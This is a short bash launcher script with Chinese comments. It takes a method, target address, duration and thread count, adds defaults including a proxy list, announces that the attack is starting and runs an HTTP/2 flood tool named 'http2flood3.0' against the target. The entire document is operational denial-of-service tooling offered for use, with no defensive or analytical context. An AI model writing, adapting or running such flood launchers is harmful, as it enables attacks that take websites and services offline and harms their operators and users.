#!/bin/bash

# --- 1. 检查是否输入了前4个参数 ---
if [ -z "$4" ]; then
    echo "错误：请输入完整的4个参数！"
    echo "用法: ./cc <方式> <地址> <时间> <线程>"
    exit 1
fi

# --- 2. 设置后面5个默认值 (根据需要修改) ---
P5="64"
P6="65555"
P7="16384b"
P8="131072b"
P9="proxy.txt"

# --- 3. 执行副脚本 (关键修改在这里) ---
# 注意：这里不要用引号把 $1 $2 包在同一个大引号里，要分开写
echo "正在启动攻击..."
./http2flood3.0 "$1" "$2" "$3" "$4" "$P5" "$P6" "$P7" "$P8" "$P9"
